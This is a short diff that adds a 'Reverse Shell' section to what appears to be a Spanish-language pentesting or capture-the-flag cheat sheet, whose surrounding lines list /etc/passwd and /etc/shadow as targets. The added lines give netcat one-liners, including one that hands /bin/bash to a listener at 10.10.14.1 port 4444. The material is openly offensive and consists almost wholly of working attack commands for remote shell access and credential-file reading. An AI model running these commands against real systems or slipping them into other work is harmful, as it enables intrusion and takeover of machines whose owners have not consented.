@@ -5,6 +5,14 @@
 `/etc/passwd`
 `/etc/shadow`
 
+## Reverse Shell
+```shell
+nc 10.10.14.1 4444 # comunmente bloqueado
+```
+```shell
+nc -e /bin/bash 10.10.14.1 4444
+```
+
 ## PHP
 
 ### Encodear
